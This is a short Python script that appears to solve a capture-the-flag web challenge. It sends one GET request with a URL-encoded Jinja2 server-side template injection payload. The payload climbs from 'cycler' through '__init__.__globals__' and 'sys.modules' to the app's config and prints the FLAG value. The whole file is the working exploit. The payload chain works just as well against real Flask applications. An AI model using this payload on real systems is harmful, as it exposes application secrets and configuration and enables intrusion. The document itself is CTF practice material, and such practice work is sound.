from requests import get


if __name__ == "__main__":
    with get(
        "https://bro-visited-his-site.jellyc.tf/response?word=%7B%7B+cycler.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.config.FLAG+%7D%7D"
    ) as req:
        print(req.text)
